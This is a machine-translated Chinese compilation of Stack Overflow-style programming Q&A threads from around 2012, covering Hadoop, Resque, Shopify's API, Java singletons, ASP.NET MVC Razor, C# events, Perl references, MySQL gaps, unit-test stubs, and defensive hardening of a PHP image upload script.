## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T15:13:21.037

您的工作正在尝试从以下位置读取输入文件：

```
 hdfs://HadoopMaster:54310/user/hduser/csvtable 
```

[您应该使用 hadoop shell 工具](http://hadoop.apache.org/common/docs/r0.19.0/hdfs_shell.html#ls)验证此文件是否存在于 HDFS 上：

```
hadoop fs -ls /user/hduser/csvtable 
```

我的猜测是您的文件尚未加载到 HDFS 上。

# ruby - Resque 工人领班未能启动工人

> ID：12318892
> 
> 赞同：1
> 
> 时间：2012-09-07T13:17:44.850
> 
> 标签：ruby, resque, foreman

我有一个工头脚本在独立的 ruby​​ 应用程序上启动一些工作人员。这是脚本

**工头脚本** `worker: bundle exec rake resque:work BACKGROUND=true QUEUE=image VERBOSE=true`

当我运行脚本时，这是我得到的输出。

```
$ foreman start
22:00:38 worker.1 | started with pid 882
22:00:38 worker.1 | exited with code 0
22:00:38 system   | sending SIGTERM to all processes
SIGTERM received 
```

该过程似乎已经退出，但是当我查看`ps -eaf | grep resque`日志时，它显示了一个使用 pid 884 运行的 resque 工作人员。我已经对此进行了测试，并且它总是比原来的 pid +2。

当我在没有工头的情况下直接从终端运行 bundle exec 命令时，该命令执行得很好。工头脚本有什么我遗漏的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T19:20:03.130

显然，当运行背景=真时，resque 工作人员被守护，因此原始 pid 被删除，一个新的 pid 被作为工作人员的孤儿进程生成。

尽管如此，在使用工头创建 2 个后台工作人员时仍然存在问题，因为一旦其中一名工作人员被守护，工头将结束所有进程，并且只会创建一个守护工作人员而不是两个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T09:18:28.450

您不应该使用工头来守护工作人员 - 工头需要让所有进程都在前台运行。如果您想要多个工人，只需使用以下内容：

```
image_worker: bundle exec rake resque:work QUEUE=image VERBOSE=true
other_worker: bundle exec rake resque:work QUEUE=other VERBOSE=true 
```

在同一个队列上启动多个工作人员：

```
foreman start -m image_worker=2 
```

# silverlight - 调试 Silverlight 应用程序时 Internet Explorer 菜单选项灰显

> ID：12318893
> 
> 赞同：3
> 
> 时间：2012-09-07T13:17:47.530
> 
> 标签：silverlight, debugging

我对此感到茫然，我有一个问题，在调试时可能有 50% 的时间会弹出。我的 silverlight 应用程序有一种情况，我实际上打开了同一个项目的另一个选项卡 基本上，当我尝试打开另一个选项卡时，它只是在开始打开选项卡后挂起，但从未真正完成。

标签是引起我注意的第一件事，但我认为浏览器的状态可能有问题，我可以在打开另一个标签之前打开工具菜单，几乎所有选项都显示为灰色

![在此处输入图像描述](../Images/4c760ba8f7dbf861153304aa9be8b00e.png)

值得注意的几件事。这只是我调试时的一个问题，并且我团队中的每个人都可以（随机地）重现它。

# android - 如何在 Android 中使用 UTF-8 编码？

> ID：12318894
> 
> 赞同：0
> 
> 时间：2012-09-07T13:17:49.870
> 
> 标签：android, utf-8, xml-parsing

我正在开发一个法语 Android 应用程序，其中 é、ê、â 等重音像符号一样显示，这是为 XML 链接获取的。如何解决此问题以显示法语同意中的字符？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:31:09.197

用 Java 读取 UTF-8 XML 文件 – (SAX Parser)

[http://www.mkyong.com/java/how-to-read-utf-8-xml-file-in-java-sax-parser/](http://www.mkyong.com/java/how-to-read-utf-8-xml-file-in-java-sax-parser/)

[将 UTF-8 编码数据发布到服务器会丢失某些字符](https://stackoverflow.com/questions/5270591/post-utf-8-encoded-data-to-server-loses-certain-characters)

# api - Shopify API：按日期在 Shopify 中获取订单

> ID：12318899
> 
> 赞同：2
> 
> 时间：2012-09-07T13:18:14.070
> 
> 标签：api, date, get, shopify, orders

为什么按日期和限制从 Shopify 商店获取订单总是返回最新日期的订单？比如：如果我使用此查询查询从 2012 年 8 月 1 日起获得 5 个订单： `/admin/orders.json?status=open&created_at_min=2012-08-01 12:00&limit=5`

因为我在 2012 年 8 月 20 日有 5 个订单，在 2012 年 8 月 31 日有 5 个订单，但这将返回 5 个最新日期（2012 年 8 月 31 日）的订单。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-09T23:39:53.497

Shopify API 从最近到最旧的顺序返回订单。

当您提交查询时，Shopify 将首先创建一个包含十个订单的数组；前五个是从 8 月 31 日开始，后五个是从 8 月 20 日开始。

然后，通过将其限制为五个订单，Shopify 为您提供前五个订单。

据我所知，无法在 Shopify API 中指定您自己的排序顺序。您需要获取*所有*订单，`created_at_min= 2012-08-01`然后使用您编写的任何语言，获取数组中的最后 5 个项目。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-15T19:55:16.430

它没有记录，但您可以通过添加：`order=processed_at+asc`到您的查询来做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-14T12:47:16.973

`&created_at_max=2012-08-01 11:59`成功了

[shopify](http://www.shopify.com/?ref=softwarevamp) [订单 api](http://docs.shopify.com/api/order.html#index)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-10-20T08:43:32.840

Shopify API 专门针对 EST/EDT 时间工作。所以首先将您的时区时间转换为 EDT，这样您就可以根据 EDT 时区标记确切的时间。

让我们理解这个例子：目前，我在 JST（东京/亚洲）时区，现在我想根据日本时间从订单 API 中获取 2021-10-20 的记录。所以我需要做这种请求参数：

接口：

```
orders.json?status=any&limit=250 
```

根据日期 2021-10-20 (JST) 的有效参数

1.  如果要求是 updated_at 日期

    `&updated_at_min=2021-10-19T11:00:00-04:00&updated_at_max=2021-10-20T11:00:00-04:00`

2.  对于 created_at 日期

    `&created_at_min=2021-10-19T11:00:00-04:00&created_at_max=2021-10-20T11:00:00-04:00`

在这里，我们实际上已将 JST (+09:00) 格式的日期转换为 EST(-04:00) 以确保我从 API 获取的数据应该仅适用于 2021-10-20 日期（从 2021 年 10 月 20 日 00:00:00 到 2021 年 10 月 21 日 00:00:00 [JST]）。

同样，您可以根据您的时区创建日期 (EDT) 格式。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-06-16T12:41:57.860

两个日期之间

```
/admin/orders.json?created_at_min=2012-08-01 12:00&limit=2012-08-01 12:00 
```

# oop - 单例子类

> ID：12318901
> 
> 赞同：2
> 
> 时间：2012-09-07T13:18:18.283
> 
> 标签：oop, singleton, subclass

我有一个抽象基类和一个实现类，例如：

```
public abstract class Base
{
   public Base getInstance( Class<? extends Base> clazz )
   {
      //expected to return a singleton instance of clazz's class
   }

   public abstract absMeth();
}

public A extends Base
{
    //expected to be a singleton
} 
```

在这个例子中，我可以让 A 成为一个单例，甚至在 Base 中编写 getInstance 来为每次调用返回一个 A 的单例对象，这样做是这样的：

```
public abstract class Base
{
   public Base getInstance( Class<? extends Base> clazz )
   {
      try
      {
         return clazz.getDeclaredMethod("getInstance").invoke(null,null);
      }
   }

   public abstract void absMeth();
}

public A extends Base
{
    private static A inst;

    private A(){}

    public static A getInstance( )
    {
       if( inst!= null)
            inst = new A();
       return inst; 
    }

    public void absMeth(){
      //...
    }
} 
```

但我关心的是如何确保如果有人编写另一个类`class B extends Base`，它也应该是一个单例，并且它必须实现一个名为 getInstance 的静态方法？

换句话说，我需要将其作为与该类一起扩展的所有类的规范来强制执行`Base`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:36:48.713

您不能相信扩展您创建自己的单个实例的类¹：即使您可以以某种方式确保它们都实现`getInstance`，也无法告诉`inst`在构造自己的新实例之前在该方法内部检查它们。

保持对过程的控制：创建一个`Map<Class,Base>`，并实例化通过反射传入的类²。现在您的代码可以决定是否创建实例，而无需依赖`getInstance`子类。

* * *

¹一句流行的谚语说：“如果你想把工作做好，那就自己做吧。”

²这是一个描述基于解决方案的[链接](http://www.java2s.com/Tutorial/Java/0125__Reflection/CallPrivateconstructor.htm)`setAccessible(true)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:43:03.877

单例是一种设计模式，而不是一种语言特性。通过语法以某种方式在继承树上强制执行它几乎是不可能的。

当然可以通过声明来要求所有子类实现一个方法，`abstract`但是没有办法控制实现细节。单例是关于实现细节的。

但**为什么这是一个问题**呢？不要让你的应用依赖于别人代码的内部细节。这是 Bad Design™，出现此问题是一个明确的迹象。针对定义明确的接口进行编码，避免依赖内部细节。

# facebook - 只返回一个结果的 Facebook 搜索查询

> ID：12318903
> 
> 赞同：0
> 
> 时间：2012-09-07T13:18:27.393
> 
> 标签：facebook, facebook-graph-api

有人有这样一个查询的例子吗？我需要查询[https://graph.facebook.com/search](https://graph.facebook.com/search)地址而不是特定用户。我想看看我得到的响应，特别是如果 Facebook 仍然包含一个数据元素，即使只有一个结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T16:42:43.547

不确定我是否正确理解您的问题，但您可以限制使用 LIMIT 获得的结果数量：

[https://graph.facebook.com/search?q=facebook&type=application&limit=1](https://graph.facebook.com/search?q=facebook&type=application&limit=1)

# java - 仅三个 Eclipse 实例之一中的 Java 安全性 NoSuchAlgorithmException

> ID：12318904
> 
> 赞同：0
> 
> 时间：2012-09-07T13:18:28.963
> 
> 标签：java, eclipse, security, settings

最近遇到了一个问题

> java.security.NoSuchAlgorithmException：算法 HmacSHA1 不可用

尝试使用以下简单代码来隔离问题：

> ```
> import java.security.NoSuchAlgorithmException;
> 
> import javax.crypto.Mac;
> 
> public class Main {
>   public static void main(String... args) {
> 
>       final String HMAC_SHA1_ALGORITHM = "HmacSHA1";
>       Mac instance;
>       try {
>           instance = Mac.getInstance(HMAC_SHA1_ALGORITHM);
>       } catch (NoSuchAlgorithmException e) {
>           final String errmsg = "NoSuchAlgorithmException: "
>                   + HMAC_SHA1_ALGORITHM + " " + e;
>           // ...
>       }
> 
>   }
> } 
> ```

问题是这适用于我的一个 Eclipse 实例，而不是另一个。全部使用 New Java Project 进行测试，粘贴以上内容并运行，所以这*应该*是由于 Eclipse 实例之间的一些设置差异造成的。

我试图查看所有看似相关的设置（类路径、JRE、Java 编译器），但没有任何东西看起来不同，或者如果改变了它就可以工作。（如果有人知道如何“区分”两个 Eclipse 的设置，请告诉！）

我正在诉诸于简单地使用第三个 Eclipse（它工作的地方（到目前为止）），但是了解这个潜在的令人愤怒的问题到底是什么仍然很有趣。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-13T10:30:12.310

我使用 Eclipse 和 tomcat 遇到了同样的异常，我所做的是：

通过 TOMCAT 8 配置重新加载 JDK，它开始工作

# c# - MVC Razor 按钮单击甚至传递参数

> ID：12318905
> 
> 赞同：11
> 
> 时间：2012-09-07T13:18:31.230
> 
> 标签：c#, html, .net, asp.net-mvc, razor

我是 MVC Razor 的新手。

我有这样的看法：

```
@model SuburbanCustPortal.Models.CustomerModel

@{
    ViewBag.Title = "Customer Summary";
}

<h2>Customer Summary Screen</h2>
<p>
    Please select an account below or add an existing account.
</p>

<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>

@using (Html.BeginForm())
{
  @Html.ValidationSummary(true, "Account creation was unsuccessful. Please correct the errors and try again.")

  <div>
    <fieldset>
      <legend>Existing Accounts</legend>

      @Html.Action("ExistingAccounts2")

      <p>
        <input type="submit" value="Add an Account" />
      </p>

    </fieldset>
  </div>
} 
```

调用此方法：

```
[Authorize]
public ActionResult ExistingAccounts2()
{
  return PartialView("ExistingAccounts", _client.RequestCustomersForAccount(User.Identity.Name));
} 
```

这反过来又称之为局部视图：

```
@model IEnumerable<SuburbanCustPortal.SuburbanService.CustomerData >

<br />
<br />
<table>

  @if (Model != null)
  {
    foreach (var usr in Model)
    {
      <tr>      
        <td>
          <input id="btnShowCustomer" name="btnShowCustomer2" type="submit" value="View"/>           
        </td>
        <td>
          @usr.AccountId
        </td>
        <td>
          @usr.Name
        </td>
@*        <td>
          @usr.DeliveryStreet
        </td>*@
      </tr>
    }
  }

</table>
<br /> 
```

最终显示如下：

![在此处输入图像描述](../Images/c319bba2a63572b23eb809adfc8eb5aa.png)

到目前为止，这一直有效。

我想要的是能够单击客户姓名旁边的按钮并拉出客户的帐户。

我如何将该客户与按钮联系起来以知道要拉起谁以及如何让按钮单击将其拉起？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:32:57.217

单击按钮后，您需要将客户编号传回：

如果您将客户编号作为模型中的属性，您可以执行以下操作：

```
<input id="btnShowCustomer" data-customerNumber="@usr.CustomerNumber" /> 
```

然后，您可以`POST`使用 @Html.ActionLink、@Ajax.ActionLink 或 jQuery 将此数据发送到服务器：

*动作链接*

```
@Html.ActionLink("LoadInfo", "Info", new {customerId=@usr.CustomerNumber}) 
```

*jQuery*

```
$("#btnShowCustomer").click(function() {

 var customerId = $("#btnShowCustomer").attr("data-customerNumber");
  $.ajax({ 
       type: "POST", 
       data: "customerId=" + customerId, 
       url: '@Url.Action("MyAction", "MyController")', 
       success: function (result) { 

       } 
 }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:23:19.410

我认为这可以解决问题！oid 将是客户的 id（我认为路径不正确 :)）

```
@Ajax.RawActionLink("Action", "Controller", new { oid = '@Model.customerID'}, new AjaxOptions { HttpMethod = "POST", UpdateTargetId = "the view you want to show" }, new { id = "btnNewB", @class = "your btn class" }) 
```

祝你好运 ;）

# php - 如何保护 PHP 图像上传脚本免受攻击？

> ID：12318907
> 
> 赞同：7
> 
> 时间：2012-09-07T13:18:49.607
> 
> 标签：php, security

我已经创建了（使用[脚本](http://www.dagondesign.com/articles/secure-php-form-mailer-script/)和一些来自 Stack 的帮助以及一些来自朋友的帮助；我对 PHP 知之甚少）一个用于本地非盈利出版物的简单页面，人们可以在其中上传照片。

我对安全性不是很好（出于无知，而不是故意疏忽），但我已采取以下步骤来保护此页面：

• PHP 脚本设置为只接受.jpg、.png 和.tif 文件进行上传；
• 保存表单内容的子文件夹权限设置为700，保存上传照片的子文件夹权限设置为700；
• 根据文档，我的主机具有以下配置，以确保只有 .php 文件作为 .php 运行：

```
<FilesMatch \.php$>
    SetHandler php52-fcgi
</FilesMatch> 
```

• 我在相关（主要和保存的内容）文件夹中放置了一个 .htaccess 文件：

```
RemoveHandler .php
RemoveHandler .inc
RemoveHandler .pl
RemoveHandler .cgi
RemoveHandler .py
RemoveHandler .fcgi 
```

然而，一夜之间，有人找到了这个测试页面，并提交了一个看似完美无害的测试消息和小 .jpg。这是一个私人测试页面，其 URL 不直观，只有我和其他三个人知道；其他人都没有发送此测试。

这显然让我担心会发生一些奇怪的事情，而且我担心我对安全性的了解不够，无法确保此页面的安全。

我有什么明显的遗漏吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T13:42:09.187

在处理上传时，您应该记住，您可以在 $_FILES 数组中找到的所有数据都可能是伪造的。它通过 HTTP 传输，因此很容易将图像/jpg mime 提供给可执行文件，例如。

**1-检查真实的哑剧**

PHP带有一些功能来检查文件的真实mime。为此，您应该使用[fileinfo](http://php.net/manual/en/book.fileinfo.php)

```
$finfo = new finfo(FILEINFO_MIME, "/usr/share/misc/magic");
$filename = "/var/tmp/afile.jpg";
echo $finfo->file($filename); 
```

**2-检查图像的属性**

您显然只想上传图片，因此接收到的文件必须有一个宽度和一个高度：

使用[getImageSize()](http://php.net/manual/en/function.getimagesize.php)获取有关图像的所有必需信息。如果它返回 false ，则该文件可能不是图像，您可以将其删除。getImageSize 也可以给你一个 mime 类型，但我不知道它是否可以信任。

**2.5- 重新处理图像**

正如 user628405 所建议的，使用 GD 重新处理图像可能是更安全的做法。

```
$img = imagecreatefrompng('vulnerable.png'); 
imagepng($img, 'safe.png'); 
```

显然，它必须根据图像类型进行调整。查看 php 文档中的所有 imagecreatefrom*。

**3-上传文件夹** 除了你已经做的：

确保您的上传文件夹在网络上不可用。验证上传的文件，然后根据需要将其移动到其他文件夹并重命名文件。它将防止黑客执行恶意文件（如果无法通过 url 访问，则无法执行）。

进一步阅读：[https ://www.owasp.org/index.php/Unrestricted_File_Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-07T13:45:41.787

不要依赖来自客户端的任何数据，包括内容类型！

不要将上传的文件保存在 Web 根目录中。上传的文件应该只能通过您的脚本访问，以便更好地控制。

不要使用原始文件名和扩展名保存上传的文件！将此数据存储在数据库中以供以后检索。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:24:40.757

您可以检查文件的 MIME 类型，但不必担心，只要您的 php 处理程序只能执行 .php 文件并且您注意不在脚本中保存上传的 .php 文件，就不会暴露任何安全漏洞。

这对于 .php 文件以及安装在您的服务器上的任何其他服务器端脚本语言当然是有效的。

**一个更好的主意是保留您接受的扩展的白色以保存在您的文件系统上。**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:31:00.947

我会忽略传入文件的 MIME 类型和文件扩展名。这些是可以伪造的。

如果您要走这条路，请将这些文件存储在目录中。

确保该目录仅用于图像（音乐），然后通过查看文件格式获取脚本以在其上放置正确的扩展名。

还要确保该目录不能执行 PHP（或其他任何东西）。

这将保证您的安全。

# c# - c# 通过rdp扫描api

> ID：12318908
> 
> 赞同：2
> 
> 时间：2012-09-07T13:18:53.007
> 
> 标签：c#, api, rdp

我正在使用 API 开发 C# 中的扫描应用程序。当我在本地运行应用程序时，它似乎工作正常。我的问题是该应用程序被指定为作为 RDP 应用程序运行，当我尝试从中进行扫描时，它失败说它找不到扫描仪。

我想知道是否有人知道可以实现这一目标的方法。

我希望用户使用他们本地插入的扫描仪，但来自 RDP 应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:21:36.317

您需要在 RDP 客户端中启用本地设备和资源。

选项 -> 本地资源 -> 本地设备和资源 -> 更多...

然后确保选择了您的扫描仪，并且它的设备驱动程序已安装在运行该软件的机器上。

# c# - 我对 button.Click 事件有一些问题

> ID：12318911
> 
> 赞同：1
> 
> 时间：2012-09-07T13:18:56.397
> 
> 标签：c#, events, button, click

我有一个`private void change ()`我想在按下按钮时运行的功能。我有`Button schimbare = new Button();`，如果我要按，运行该功能。

我尝试`schimbare.Click += change();`但不工作。什么是好命令？

这是代码：

```
 using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing;

namespace Programarii
{
    class InputBoxOptiuni
    {
        static TextBox textBox1 = new TextBox();

        /// <summary>
        /// Displays a dialog with a prompt and textbox where the user can enter information
        /// </summary>
        /// <param name="title">Dialog title</param>
        /// <param name="promptText">Dialog prompt</param>
        /// <param name="value">Sets the initial value and returns the result</param>
        /// <returns>Dialog result</returns>
        public static DialogResult Show(string title, string promptText, string informati, string mesaj, ref int ora, ref int minut30, ref int minut15, ref int douaore, ref int minut10, ref int minut5, ref int pornire2, ref int anuntare2, ref int cuparola, ref string parola, ref string email, ref int expirare, ref int cateminute, ref int vl, ref int culimba, string scurtaturi, string scurtaturi2, string format, ref int tipformat)
        {

Button schimbare = new Button();

schimbare.Click += change;

}

        private void change(object sender, EventArgs e)
        {

        }
    }
} 
```

对于所有这些回答我，tnx。

我尝试：

```
private void change(object sender, EventArgs e) and schimbare.Click += change; 
```

但不工作。我尝试使用`schimbare.Click += (s,e)=> { //your code };` 和工作！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:21:53.523

您的方法签名应该是这样的：

`void change(object sender, EventArgs e)`

并写为`schimbare.Click += change;`

你也可以使用这个语法

```
schimbare.Click += (s,e)=>
            {
                //your code
            }; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:21:50.153

删除`()`- 您正在*订阅*事件处理程序，而不是调用它（使用`()`will call `change`）。

```
schimbare.Click += change; 
```

请注意（除了非标准命名），您的`change`函数应该具有`EventHandler`签名（它没有 - 它不带参数），将其更改为：

```
private void change(object sender, EventArgs e) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:21:00.717

尝试

```
schimbare.Click += new EventHandler(this.change); 
```

另请参阅[此链接](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.click.aspx)以获取更多信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:23:53.960

等等！！！您正在将“更改”方法的返回值添加到 Click 事件！因此，将代码更改为此应该可以解决您的问题（括号是额外的！）。我不知道你工作的平台，请注意click的代表必须有一些参数。

干杯

```
schimbare.Click += change; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-07T13:25:17.967

你需要捕捉这样的事件：

```
 private void schimbare_Click(object sender, EventArgs e)
        {
           change();
        } 
```

希望能帮助到你...

# c# - 使用 ColdFusion 使用 ASP.Net Web 服务

> ID：12318912
> 
> 赞同：1
> 
> 时间：2012-09-07T13:19:00.450
> 
> 标签：c#, .net, coldfusion

这是我到目前为止所拥有的。我正在创建一个 ASP.NET Web 服务来记录我们的内部网站活动。我们的大多数内部站点都是用 ColdFusion 编写的。我以前在 ASP.Net 世界中使用过 Web 服务，但 ColdFusion 对我来说有点新。我刚刚开始尝试这种情况。作为对我们混合这两种技术的原因的解释：我们目前正在远离 ColdFusion，并且处于过渡阶段。

C# 代码是第一位的。我相信这是正确的。

```
 [WebService(Namespace = "http://oursite.org:86")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.ComponentModel.ToolboxItem(false)]

[System.Web.Script.Services.ScriptService]
public class LogEvent : System.Web.Services.WebService
{
    private IContainer components = null;

    public LogEvent()
    {
        InitalizeComponent();
    }

    private void InitalizeComponent()
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }

        base.Dispose(disposing);
    }

    [WebMethod]
    public string InsertEvent()
    {

        return "HellWorld";

    }
} 
```

我只有一个简单的 CFC 来调用 Web 服务。

```
<cffunction name="TestWebService" access="remote" returntype="Any" >

        <cfinvoke webservice="oursite.org:86/LogEvent.asmx?wsdl" method="InsertEvent" returnvariable="result"   >

        <cfdump var="#result#">       
  </cffunction> 
```

当我运行 CFC 方法时，我得到以下错误。

```
Unable to read WSDL from URL: 
```

我已经搜索并遵循了我找到的每一个教程和建议，但我不是 ColdFusion 的专家。我错过了什么吗？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T16:00:07.927

所以我完全将ColdFusion Server 是一个云服务器（即不在我们的网络中）和Web 服务在本地网络服务器上运行。一旦我将 ColdFusion 代码移动到本地服务器，该服务就会像预期的那样工作。

# php - 未使用的号码 mysql

> ID：12318913
> 
> 赞同：3
> 
> 时间：2012-09-07T13:19:05.780
> 
> 标签：php, mysql

如何获取表中乱序的所有记录，以便知道可以重复使用哪些帐号。我有一个从 50100 到 70100 的帐号范围。我需要知道哪些帐号未存储在表中（当前未使用），以便我可以使用。

例如说我在表中有以下数据：

```
Account Name
------  --------
50100   Test1
50105   Test2
50106   Test4 
```

.. .. .. 我应该看到结果：50101 50102 50103 50104

因为 50101-50104 是可用的帐号，因为当前不在表中。

[从http://bytes.com/topic/sql-server/answers/78426-get-all-unused-numbers-range](http://bytes.com/topic/sql-server/answers/78426-get-all-unused-numbers-range)复制

关于 MYSQL 和 PHP。

已编辑

我的范围是 10000000-99999999。

我目前的方法是使用 MySql 查询：'SELECT FLOOR(10000000 + RAND() * 89999999) AS random_number FROM contacts WHERE "random_number" NOT IN (SELECT uid FROM contacts) LIMIT 1';

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:35:37.167

解决方案 1：
生成一个表，其中包含所有可能的帐号。然后运行类似这样的查询：

```
SELECT id FROM allIDs WHERE id NOT IN (SELECT id FROM accounts) 
```

解决方案2：
将整个id列放入php或java orso中的数组中。然后运行一个 for 循环来检查数字是否在数组中。

```
$ids = (array with all ids form the table)
for($i=50100;$i<=70100;$i++){
    if(array_search($i, $ids) != -1){
        $availableids[] = $i;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:43:12.357

对服务器中的帐户进行排序，并在读取结果时查找 PHP 中的跳转。排序序列中的任何跳转都是“免费使用”的，因为它们是有序的。您可以使用类似的东西进行排序`SELECT AccountNumber FROM Accounts SORT ASCENDING;`。

为了提高效率，将空闲帐号存储在另一个表中，并使用第二个表中的号码，直到没有更多剩余。这样可以避免进行过多的完整读取（如第一段中所示），这可能会很昂贵。在此过程中，您可能希望在删除帐户的代码部分添加一个钩子，以便它们立即包含在第二个表中，从而无需第一步。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:23:18.033

一种方法是创建另一个表 - 填写所有允许的数字，然后编写一个简单的查询来查找新表中不在原始表中的那些。

# jasper-reports - 不打印报表元素时如何删除空格？

> ID：12318924
> 
> 赞同：1
> 
> 时间：2012-09-07T13:19:36.747
> 
> 标签：jasper-reports

使用 jasper 生成的 PDF 在未打印报表元素时具有空格（使用 printWhenExpression）。我试图设置 removeBlankSpace 属性，但这也没有解决所有地方的问题。

如果有任何解决方案，请帮助我。我会尝试。

# jquery - 将 jquery 插件添加到 Zurb 的 Foundation Framework

> ID：12318925
> 
> 赞同：2
> 
> 时间：2012-09-07T13:19:39.603
> 
> 标签：jquery, jquery-plugins, zurb-foundation

我正在使用 Zurbs 的 Foundation 快速原型设计框架，这很好。我想知道将另一个 jquery 插件集成到其中的正确方法。

Foundations 对如何包含其他插件非常挑剔。部分框架是一个 app.js 文件，里面有很多功能。我应该直接将我的新功能添加到那里吗？

虽然我确实了解 js（阅读正常），但我不是 js 专家，所以请给出明确解释的答案。

谢谢

（正在开发的网站是 vincentstephens.co.uk/vs5.1/portfolio - 尝试集成位于 vincentstephens.co.uk/vs5.1/portfolio/portfolio.html 的时间线滑块）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T13:12:04.413

不确定我是否错过了某些东西，但您不需要将*其集成到基础*中。如果您有另一个 jquery 插件，只需将 .js 作为任何脚本包含在内，您就完成了。

这`foundation.min.js`是一个包含所有基础插件以及 jquery 的缩小文件 - 您可能希望缩小插件并添加到此文件以进行优化。

这`app.js`是您初始化插件的地方。这通常是您摆弄自己的设置和首选默认值的文件，而不是触及`foundation.min.js`.

# perl - 连续运算符和括号

> ID：12318937
> 
> 赞同：6
> 
> 时间：2012-09-07T13:20:18.203
> 
> 标签：perl, syntax, operators, brackets, curly-brackets

我只是想学习一点 Perl 并遇到了这个问题：

```
foreach $element (@{$records})
{
    do something;
} 
```

在我的新手眼中，这写着：“对于名为 @{$records} 的数组中的每个元素，做一些事情”但是，因为这似乎是一个不太可能的数组名称（`@{$`完全是“”），我想它不是简单的？

我也遇到过“ `%$`”一起使用。我知道`%`表示散列并`$`表示标量，但不知道它们一起意味着什么。

任何人都可以阐明这些吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:24:22.297

在 Perl 中，您可以拥有对数据结构的引用（指针）：

```
# an array
my @array;

# a reference to an array
my $ref = \@array; 
```

当您有一个能够*使用*数组的引用时，您需要**取消引用**它

```
@{ $ref } 
```

如果您需要访问一个元素，如

```
$array[0] 
```

你可以对参考做同样的事情

```
${$ref}[0] 
```

花括号`{}`是可选的，您也可以使用

```
$$ref[0]
@$ref 
```

但我个人觉得它们的可读性较差。

这同样适用于所有其他类型（如`%$`哈希引用）。

有关详细信息，请参阅[man perlref](http://perldoc.perl.org/perlref.html) [，](http://perldoc.perl.org/perlreftut.html)有关教程，请参阅 man perlreftut。

**编辑**

箭头运算符`->`也可用于取消引用数组或哈希

```
$array_ref->[0] 
```

或者

```
$hash_ref->{key} 
```

有关详细信息，请参阅[man perlop](http://perldoc.perl.org/perlop.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:24:06.243

如果您有对数组或散列的引用，您将使用标量来保存引用：

```
my $href = \%hash;
my $aref = \@array; 
```

当您想取消引用这些引用时，您将使用适合引用类型的符号：

```
for my $element (@$aref) {
}

for my $key (keys %$href) {
} 
```

# c# - 使用其他方法的方法的单元测试

> ID：12318947
> 
> 赞同：1
> 
> 时间：2012-09-07T13:20:51.300
> 
> 标签：c#, unit-testing

我是单元测试的新手，并且对如何编写这样的单元测试方法感到困惑：

```
public Boolean BeepInTime(Interfaces.IDateTime time,TimeSpan beepTime)
{
    Interfaces.IBeep beep= new Beep();
    var h = time.GetTime();
    if (h == beepTime)
    {
       return beep.Beeping();
    }
    else
    {
       return false;
    }
}

public Boolean Beeping()
{
    try
    {
      SystemSounds.Beep.Play();
      return true;
    }
    catch
    {
      return false;
    }
} 
```

测试时`BeepInTime`，我希望 ( `beep.Beeping()`) 不运行。我阅读了 stub 并认为在这种情况下我应该使用 stub 但如何做到这一点令人困惑。您能否发送一些有关存根的简单示例的源代码。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:28:26.753

解决方案是 - 依赖注入。

每次你做或看到`... = new ...();`（构造）依赖注入时，基本上显式实例化都会引入依赖关系，然后有时为这样的代码编写单元测试变得不简单。

因此，与其显式实例化`Beep`类，不如注入它。有什么好处——你已经有一个抽象这个类的接口——`IBeep`这将允许你在编写单元测试时创建和注入一个模拟而不是真正的类实例。

```
public Boolean BeepInTime(Interfaces.IBeep beeper, TimeSpan beepTime) 
{
    var h = time.GetTime();            
    if (h == beepTime)            
    {                 
        return beep.Beeping();            
    } 

    return false;
} 
```

Ans 只是想象一下这种技术在注入 DB 访问服务或 Web 服务的情况下是如何有帮助的，在编写单元测试时您不需要真正的 DB 或 Web 服务——您只需模拟 DB/Web 服务就可以了。

使用 RhinoMocks 的示例：

```
var mock = MockRepository.GenerateMock<IBeep>();

// setup Beeping() return value == true
